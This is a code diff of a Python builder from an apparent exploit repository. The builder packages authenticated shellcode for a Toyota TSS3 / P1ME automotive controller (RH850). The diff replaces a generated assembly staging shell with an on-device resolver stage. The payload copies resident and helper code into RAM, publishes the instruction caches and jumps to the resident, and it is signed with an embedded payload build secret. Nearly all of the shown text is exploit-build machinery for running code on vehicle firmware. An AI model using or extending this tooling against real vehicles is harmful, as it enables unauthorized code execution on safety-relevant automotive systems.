@@ -6,17 +6,15 @@ import argparse
 import json
 import re
 import shutil
-import struct
 import subprocess
 import tempfile
 from pathlib import Path
-from typing import Any
+from typing import Any, cast
 
-from exploit.common.payload_package import package_shellcode
+from exploit.common.payload_package import inspect_payload, package_shellcode
 from exploit.common.ram_exec import TOYOTA_P1ME_PAYLOAD_BUILD_SECRET
 from exploit.common.rh850_build import (
     CJob,
-    compile_asm,
     compile_c_batch,
     jarl_targets,
     nm_symbol,
@@ -32,13 +30,14 @@ from exploit.ram_runtime.target_profiles import (
 from exploit.ram_runtime.tss3_request_signer_contract import (
     HELPER_CODE_LIMIT,
     HELPER_TRANSIT_BASE,
+    RESIDENT_BASE,
     STATE_SIZE,
 )
+from tools import REPO_ROOT as REPO
 from tools.targets.tss3.console import render_build
 
-from tools import REPO_ROOT as REPO
 BUILDER = Path(__file__).resolve()
-SCHEMA = "tss3-request-signer-build-v1"
+SCHEMA = "tss3-request-signer-build-v2"
 DEFAULT_CODEC = "four-frame"
 COMPACT_CODEC = "compact"
 CODECS: dict[str, dict[str, Any]] = {
@@ -56,6 +55,8 @@ RESIDENT_SOURCE = REPO / "exploit/ram_runtime/request_signer/tss3_request_signer
 RESIDENT_ENTRY_SOURCE = REPO / "exploit/ram_runtime/request_signer/tss3_request_signer_resident.S"
 HELPER_SOURCE = REPO / "exploit/ram_runtime/request_signer/tss3_request_signer_helper.c"
 ABI_HEADER = REPO / "exploit/ram_runtime/request_signer/tss3_request_signer.h"
+RESOLVER_SOURCE = REPO / "exploit/ram_runtime/request_signer/tss3_request_signer_resolver.c"
+STAGE_ENTRY_SOURCE = REPO / "exploit/ram_runtime/request_signer/tss3_request_signer_stage.S"
 STATE_MAGIC = 0x4C433841  # little-endian "A8CL"
 STATE_VERSION = 3
 UNIVERSAL_SIGNER_HELPER_CODE_LIMIT = HELPER_CODE_LIMIT
@@ -64,7 +65,7 @@ SPECULATIVE_FETCH_GUARD_SIZE = 48
 # Own C frames only; stock firmware callees and interrupts are not included.
 RESIDENT_STACK_BUDGET = 0
 HELPER_STACK_BUDGET = 24
-CACHE_PUBLICATION = bytes.fromhex("1f001c00")  # syncp; synci
+CACHE_PUBLICATION_SEQUENCE = bytes.fromhex("1f001c00")  # syncp; synci
 CMP_IMMEDIATE_RE = re.compile(
     r"\bcmp\s+(-?(?:0x[0-9a-fA-F]+|[0-9]+))\s*,"
 )
@@ -82,14 +83,12 @@ def default_output_dir(target: str, *, codec: str = DEFAULT_CODEC) -> Path:
 
 STAGING_BASE = 0xFEBF0000
 STAGING_LIMIT = 0xFD0
-PROFILE_DATA_OFFSET = 0x180
-PROFILE_HEADER_FIXED_BUDGET = 0xC0
-PROFILE_SELECTOR_ROW_BUDGET = 0x40
+RESIDENT_STAGING_OFFSET = 0xB4C
+RESOLVER_OUTPUT_BASE = 0xFEBFFB7C
 
-# One runtime config is selected by the staging shell and copied into the end of
-# the common retained resident pocket. All addresses before CFG_STATE_BASE are
-# recovered from the exact CodeFlash control-flow shape; the rest is the small
-# signer/I/O ABI that cannot be replaced by direct peripheral ownership.
+# The resolver writes five boot-transition targets followed immediately by the
+# resident's 27-word configuration. The retained resident and helper consume
+# only this fixed ABI; no software ID or target profile enters the payload.
 CONFIG_FIELDS = (
     "app_context",
     "startup_first",
@@ -122,159 +121,10 @@ CONFIG_FIELDS = (
 CONFIG_OFFSETS = {name: index * 4 for index, name in enumerate(CONFIG_FIELDS)}
 CONFIG_SIZE = len(CONFIG_FIELDS) * 4
 CONFIG_BASE = 0xFEBFFBFC - CONFIG_SIZE
-RESIDENT_CODE_LIMIT = CONFIG_BASE - 0xFEBFF9F0
-
-
-def align(value: int, boundary: int) -> int:
-    return (value + boundary - 1) & ~(boundary - 1)
-
-
-def profile_data_offset(profiles: list[dict[str, Any]]) -> int:
-    header_budget = (
-        PROFILE_HEADER_FIXED_BUDGET
-        + len(profiles) * PROFILE_SELECTOR_ROW_BUDGET
-    )
-    return max(PROFILE_DATA_OFFSET, align(header_budget, 0x20))
-
-
-def _profile_selector_source(profiles: list[dict[str, Any]]) -> str:
-    blocks: list[str] = []
-    shared_address = (
-        profiles[0]["software_id_address"]
-        if len({profile["software_id_address"] for profile in profiles}) == 1
-        else None
-    )
-    for index, profile in enumerate(profiles):
-        words = struct.unpack("<3I", profile["software_id"].encode("ascii"))
-        fail_label = f".L_try_profile_{index + 1}" if index + 1 < len(profiles) else ".L_fail"
-        checks = (
-            [] if shared_address is not None
-            else [f"    mov 0x{profile['software_id_address']:08x}, r6"]
-        )
-        for offset, word in enumerate(words):
-            checks.extend((
-                f"    ld.w {offset * 4}[r6], r7",
-                f"    mov 0x{word:08x}, r8",
-                "    cmp r8, r7",
-                f"    bne {fail_label}",
-            ))
-        checks.extend((
-            f"    movhi hi(runtime_profile_{index}), r0, r20",
-            f"    movea lo(runtime_profile_{index}), r20, r20",
-            "    br .L_profile_selected",
-        ))
-        if index + 1 < len(profiles):
-            checks.append(f"{fail_label}:")
-        blocks.append("\n".join(checks))
-    return "\n".join(blocks)
-
-
-def _profile_table_source(profiles: list[dict[str, Any]]) -> str:
-    rows = []
-    for index, profile in enumerate(profiles):
-        values = [*profile["boot_calls"], *(profile["config"][name] for name in CONFIG_FIELDS)]
-        rows.append(
-            f"    .align 4\nruntime_profile_{index}:\n"
-            + "\n".join(f"    .long 0x{value & 0xFFFFFFFF:08x}" for value in values)
-        )
-    return "\n".join(rows)
-
-
-def staging_source(
-    *,
-    resident_offset: int,
-    resident_size: int,
-    helper_offset: int,
-    helper_size: int,
-    profiles: list[dict[str, Any]],
-) -> str:
-    selector = _profile_selector_source(profiles)
-    selector_addresses = {profile["software_id_address"] for profile in profiles}
-    selector_preamble = (
-        f"    mov 0x{next(iter(selector_addresses)):08x}, r6"
-        if len(selector_addresses) == 1 else ""
-    )
-    tables = _profile_table_source(profiles)
-    return f'''    .section .text
-    .global _exploit
-_exploit:
-{selector_preamble}
-{selector}
-
-.L_profile_selected:
-    ld.w 0[r20], r12
-    jarl [r12], lp
-    ld.w 4[r20], r12
-    jarl [r12], lp
-    ld.w 8[r20], r12
-    jarl [r12], lp
-    ld.w 12[r20], r12
-    jarl [r12], lp
-    ld.w 16[r20], r12
-    jarl [r12], lp
-    cmp r0, r10
-    bne .L_fail
-
-    movhi 0xFEBF, r0, r6
-    movea 0x{resident_offset:04X}, r6, r6
-    mov 0xFEBFF9F0, r7
-    movea {resident_size}, r0, r8
-.L_copy_resident:
-    ld.b 0[r6], r9
-    st.b r9, 0[r7]
-    add 1, r6
-    add 1, r7
-    add -1, r8
-    cmp r0, r8
-    bne .L_copy_resident
-    ld.b -1[r7], r9
-    syncp
-    synci
-
-    movhi 0xFEBF, r0, r6
-    movea 0x{helper_offset:04X}, r6, r6
-    mov 0xFEF07C00, r7
-    movea {helper_size}, r0, r8
-.L_copy_helper:
-    ld.b 0[r6], r9
-    st.b r9, 0[r7]
-    add 1, r6
-    add 1, r7
-    add -1, r8
-    cmp r0, r8
-    bne .L_copy_helper
-    ld.b -1[r7], r9
-    syncp
-    synci
-
-    movea 20, r20, r6
-    mov 0x{CONFIG_BASE:08x}, r7
-    movea {CONFIG_SIZE // 4}, r0, r8
-.L_copy_config:
-    ld.w 0[r6], r9
-    st.w r9, 0[r7]
-    add 4, r6
-    add 4, r7
-    add -1, r8
-    cmp r0, r8
-    bne .L_copy_config
-
-    .global request_signer_resident_handoff
-request_signer_resident_handoff:
-    mov 0xFEBFF9F0, r12
-    jmp [r12]
-.L_fail:
-    br .L_fail
-
-    .org 0x{resident_offset:X}
-resident_blob:
-    .incbin "/out/resident_padded.bin"
-    .org 0x{helper_offset:X}
-helper_blob:
-    .incbin "/out/helper_padded.bin"
-
-{tables}
-'''
+RESIDENT_CODE_LIMIT = CONFIG_BASE - RESIDENT_BASE
+RESOLVER_STACK_BUDGET = 256
+if RESOLVER_OUTPUT_BASE + 5 * 4 != CONFIG_BASE:
+    raise AssertionError("resolver output/config ABI drift")
 
 
 def need(cond: bool, msg: str) -> None:
@@ -295,68 +145,10 @@ def validate_cmp_immediates(source: str, *, label: str) -> None:
         )
 
 
-
-
-def runtime_config(spec: dict[str, Any]) -> dict[str, int]:
-    config = dict(spec["runtime_config"])
-    need(tuple(config) == CONFIG_FIELDS, "runtime config field order drift")
-    return config
-
-
-def runtime_profiles(specs: dict[str, dict[str, Any]]) -> list[dict[str, Any]]:
-    by_software_id: dict[str, dict[str, Any]] = {}
-    for name, spec in specs.items():
-        software_id = spec["runtime_software_id"]
-        row = {
-            "software_id": software_id,
-            "software_id_address": spec["runtime_software_id_address"],
-            "boot_calls": list(spec["boot_calls"]),
-            "config": runtime_config(spec),
-            "targets": [name],
-        }
-        existing = by_software_id.get(software_id)
-        if existing is None:
-            by_software_id[software_id] = row
-        else:
-            need(
-                existing["software_id_address"] == row["software_id_address"]
-                and existing["boot_calls"] == row["boot_calls"]
-                and existing["config"] == row["config"],
-                f"{software_id} resolves to conflicting runtime profiles",
-            )
-            existing["targets"].append(name)
-    return list(by_software_id.values())
-
-
-def profile_status(
-    candidate: dict[str, Any],
-    current_profiles: list[dict[str, Any]],
-) -> dict[str, Any]:
-    software_id = candidate["runtime_software_id"]
-    current = next(
-        (profile for profile in current_profiles if profile["software_id"] == software_id),
-        None,
-    )
-    if current is None:
-        return {
-            "status": "compatible-profile-missing",
-            "current_targets": [],
-        }
-    same = (
-        current["software_id_address"] == candidate["runtime_software_id_address"]
-        and current["boot_calls"] == candidate["boot_calls"]
-        and current["config"] == runtime_config(candidate)
-    )
-    need(same, f"{software_id} conflicts with the current universal profile")
-    return {
-        "status": "covered-by-current-build",
-        "current_targets": current["targets"],
-    }
-
-
 def config_macros() -> dict[str, int]:
     return {
         "ORACLE_CONFIG_BASE": CONFIG_BASE,
+        "RESOLVER_OUTPUT_BASE": RESOLVER_OUTPUT_BASE,
         **{f"CFG_{name.upper()}": offset for name, offset in CONFIG_OFFSETS.items()},
     }
 
@@ -396,7 +188,6 @@ def build_request_signer(
         raise ValueError("output stem must be a filename stem without path separators")
 
     specs = registered_specs()
-    current_profiles = runtime_profiles(specs)
     transport_ids = {
         (spec["request"]["request_id"], spec["request"]["response_id"])
         for spec in specs.values()
@@ -407,15 +198,17 @@ def build_request_signer(
         if codeflash is not None
         else specs[target if target is not None else TARGETS[0]]
     )
-    compatibility = profile_status(selected, current_profiles)
-    specs[selected["name"]] = selected
-    universal_profiles = runtime_profiles(specs)
+    compatibility = {
+        "status": "self-resolved-compatible",
+        "resolver": "on-device-codeflash",
+        "codeflash_sha256": selected["sha256"],
+    }
     codec_spec = CODECS[codec]
     out = output_dir if output_dir is not None else default_output_dir(selected["name"], codec=codec)
     out.mkdir(parents=True, exist_ok=True)
     file_stem = stem if stem is not None else output_stem(selected["name"], codec)
-    profile_path = out / f"{file_stem}_profile.json"
-    profile_path.write_text(
+    contract_path = out / f"{file_stem}_contract.json"
+    contract_path.write_text(
         json.dumps(selected["contract"], indent=2, sort_keys=True) + "\n",
         encoding="utf-8",
     )
@@ -442,7 +235,7 @@ def build_request_signer(
                     str(RESIDENT_ENTRY_SOURCE.relative_to(REPO)),
                     str(RESIDENT_SOURCE.relative_to(REPO)),
                 ),
-                stem="resident", vma=int(selected["resident_base"]), entry="_resident_entry",
+                stem="resident", vma=RESIDENT_BASE, entry="_resident_entry",
                 symbols={"_helper_entry": HELPER_TRANSIT_BASE},
                 defines={}, preinclude="signer_config.h",
                 stack_budget=RESIDENT_STACK_BUDGET,
@@ -466,13 +259,13 @@ def build_request_signer(
              f"{codec} helper plus speculative-fetch guard exceeds universal layout: "
              f"{len(helper_blob)} > {UNIVERSAL_SIGNER_HELPER_CODE_LIMIT}")
 
-        need(nm_symbol(str(resident["nm"]), "resident_entry") == selected["resident_base"],
+        need(nm_symbol(str(resident["nm"]), "resident_entry") == RESIDENT_BASE,
              "resident entry drift")
         resident_tick_wait = nm_symbol(str(resident["nm"]), "resident_tick_wait")
         if resident_tick_wait is None:
             raise RuntimeError("resident tick-wait symbol missing")
         need(not resident["relocations"], "resident retains relocations")
-        resident_base = int(selected["resident_base"])
+        resident_base = RESIDENT_BASE
         need(resident_tick_wait >= resident_base + STATE_SIZE,
              "live scheduler overlaps the reclaimed state prefix")
         for symbol in ("resident_state_clear", "resident_forever"):
@@ -485,56 +278,81 @@ def build_request_signer(
             or resident_base + STATE_SIZE <= target < resident_base + resident_code_size
             for target in resident_calls
         ), f"resident retained a target-specific direct call: {resident_calls}")
+        resident_blob += b"\0" * (-len(resident_blob) % 4)
         resident_blob += b"\0" * SPECULATIVE_FETCH_GUARD_SIZE
         need(len(resident_blob) <= RESIDENT_CODE_LIMIT,
              f"resident plus speculative-fetch guard overlaps runtime config: "
              f"{len(resident_blob)} > {RESIDENT_CODE_LIMIT}")
 
-        resident_offset = profile_data_offset(universal_profiles)
-        helper_offset = align(resident_offset + len(resident_blob), 4)
-        need(helper_offset + len(helper_blob) <= STAGING_LIMIT, "resident/helper exceed staging budget")
-        # Keep compiler outputs immutable. A host rewrite of a file just
-        # produced through a Docker bind mount can leave the next container
-        # reading its previous length, omitting the fetch guard from .incbin.
-        (work / "resident_padded.bin").write_bytes(resident_blob)
-        (work / "helper_padded.bin").write_bytes(helper_blob)
-        generated_staging_source = staging_source(
-            resident_offset=resident_offset,
-            resident_size=len(resident_blob),
-            helper_offset=helper_offset,
-            helper_size=len(helper_blob),
-            profiles=universal_profiles,
-        )
-        validate_cmp_immediates(generated_staging_source, label="generated staging source")
-        (work / "staging.S").write_text(generated_staging_source, encoding="utf-8")
-        stage = compile_asm(
-            work=work,
-            source="staging.S",
-            stem="staging",
-            vma=STAGING_BASE,
-            symbols={},
-            source_in_repo=False,
-        )
-        stage_blob = stage["blob"]; assert isinstance(stage_blob, bytes)
+        resident_offset = RESIDENT_STAGING_OFFSET
+        helper_offset = STAGING_LIMIT - len(helper_blob)
+        resident_embedded = resident_blob[:-SPECULATIVE_FETCH_GUARD_SIZE]
+        helper_embedded = helper_blob[:-SPECULATIVE_FETCH_GUARD_SIZE]
         need(
-            stage_blob[:resident_offset].count(CACHE_PUBLICATION) == 2,
-            "assembled staging lacks two resident/helper cache-publication sequences",
+            resident_offset + len(resident_embedded) <= helper_offset,
+            "resident overlaps the staged helper: "
+            f"0x{resident_offset + len(resident_embedded):X} > 0x{helper_offset:X}",
         )
+        need(helper_offset + len(helper_blob) == STAGING_LIMIT,
+             "helper source guard no longer ends at the authenticated callback boundary")
+        stage = compile_c_batch(work, (
+            CJob(
+                sources=(
+                    str(STAGE_ENTRY_SOURCE.relative_to(REPO)),
+                    str(RESOLVER_SOURCE.relative_to(REPO)),
+                ),
+                stem="resolver", vma=STAGING_BASE, entry="_exploit",
+                symbols={},
+                defines={
+                    "STAGED_RESIDENT_BASE": STAGING_BASE + resident_offset,
+                    "STAGED_HELPER_BASE": STAGING_BASE + helper_offset,
+                    "INSTALL_RESIDENT_BASE": RESIDENT_BASE,
+                    "RESIDENT_SIZE": len(resident_embedded),
+                    "INSTALL_HELPER_BASE": HELPER_TRANSIT_BASE,
+                    "RESIDENT_GUARD_SIZE": SPECULATIVE_FETCH_GUARD_SIZE,
+                    "HELPER_SIZE": len(helper_blob),
+                },
+                preinclude="signer_config.h",
+                stack_budget=RESOLVER_STACK_BUDGET,
+            ),
+        ))[0]
+        stage_code = stage["blob"]; assert isinstance(stage_code, bytes)
+        need(nm_symbol(str(stage["nm"]), "exploit") == STAGING_BASE,
+             "resolver staging entry drift")
+        need(not stage["relocations"], "resolver staging retains relocations")
+        need(len(stage_code) <= resident_offset,
+             f"resolver staging exceeds its budget: {len(stage_code)} > {resident_offset}")
+        resolver_calls = jarl_targets(str(stage["disasm"]))
+        need(all(STAGING_BASE <= address < STAGING_BASE + len(stage_code)
+                 for address in resolver_calls),
+             f"resolver staging retained an external direct call: {resolver_calls}")
+        need(stage_code.count(CACHE_PUBLICATION_SEQUENCE) == 2,
+             "staging must publish both copied executable regions")
         resident_handoff = nm_symbol(
             str(stage["nm"]), "request_signer_resident_handoff",
         )
         need(resident_handoff is not None, "staging resident-handoff symbol missing")
-        embedded_end = helper_offset + len(helper_blob)
-        if len(stage_blob) < embedded_end:
-            stage_blob += b"\0" * (embedded_end - len(stage_blob))
-        need(len(stage_blob) <= STAGING_LIMIT, "staging exceeds authenticated shellcode budget")
-        need(stage_blob[resident_offset:resident_offset + len(resident_blob)] == resident_blob,
+        stage_blob = stage_code.ljust(resident_offset, b"\0") + resident_embedded
+        stage_blob = stage_blob.ljust(helper_offset, b"\0") + helper_embedded
+        stage_blob = stage_blob.ljust(STAGING_LIMIT, b"\0")
+        need(len(stage_blob) == STAGING_LIMIT, "staging size drift")
+        need(stage_blob[resident_offset:resident_offset + len(resident_embedded)] == resident_embedded,
              "resident embedding drift")
-        need(stage_blob[helper_offset:helper_offset + len(helper_blob)] == helper_blob,
+        need(stage_blob[helper_offset:helper_offset + len(helper_embedded)] == helper_embedded,
              "helper embedding drift")
 
         payload = package_shellcode(stage_blob, secret=TOYOTA_P1ME_PAYLOAD_BUILD_SECRET)
         need(len(payload) == 0x1000, "authenticated payload is not exact 4 KiB")
+        shellcode_region = inspect_payload(
+            payload, secret=TOYOTA_P1ME_PAYLOAD_BUILD_SECRET,
+        ).shellcode_region
+        helper_guard_start = helper_offset + len(helper_embedded)
+        need(
+            shellcode_region[
+                helper_guard_start:helper_guard_start + SPECULATIVE_FETCH_GUARD_SIZE
+            ] == bytes(SPECULATIVE_FETCH_GUARD_SIZE),
+            "authenticated shell padding does not supply the helper fetch guard",
+        )
         (out / f"{file_stem}.bin").write_bytes(stage_blob)
         (out / f"{file_stem}_resident.bin").write_bytes(resident_blob)
         (out / f"{file_stem}_helper.bin").write_bytes(helper_blob)
@@ -544,14 +362,15 @@ def build_request_signer(
         debug_dir.mkdir(exist_ok=True)
         shutil.copy2(work / "signer_config.h", debug_dir / "signer_config.h")
         debug_units = {}
-        for name, compiled in (("resident", resident), ("helper", helper)):
-            for path in compiled["files"]:
+        for name, compiled in (("resolver", stage), ("resident", resident), ("helper", helper)):
+            files = cast(list[Path], compiled["files"])
+            for path in files:
                 shutil.copy2(path, debug_dir / path.name)
             debug_units[name] = {
                 "elf": f"{name}.elf",
                 "disassembly": f"{name}.disasm",
                 "stack_reports": [
-                    path.name for path in compiled["files"] if path.suffix == ".su"
+                    path.name for path in files if path.suffix == ".su"
                 ],
                 "compile_command": compiled["compile_command"],
             }
@@ -588,7 +407,7 @@ def build_request_signer(
             },
             "resident": {
                 "path": f"{file_stem}_resident.bin",
-                "base": f"0x{int(selected['resident_base']):08X}",
+                "base": f"0x{RESIDENT_BASE:08X}",
                 "size": len(resident_blob),
                 "code_size": resident_code_size,
                 "guard_size": SPECULATIVE_FETCH_GUARD_SIZE,
@@ -605,6 +424,13 @@ def build_request_signer(
                 "sha256": sha_bytes(helper_blob),
                 "staging_offset": helper_offset,
                 "stack_frames": helper["stack_usage"],
+            },
+            "resolver": {
+                "source": str(RESOLVER_SOURCE.relative_to(REPO)),
+                "output_base": f"0x{RESOLVER_OUTPUT_BASE:08X}",
+                "config_base": f"0x{CONFIG_BASE:08X}",
+                "code_size": len(stage_code),
+                "stack_frames": stage["stack_usage"],
             },
             "staging": {
                 "path": f"{file_stem}.bin",
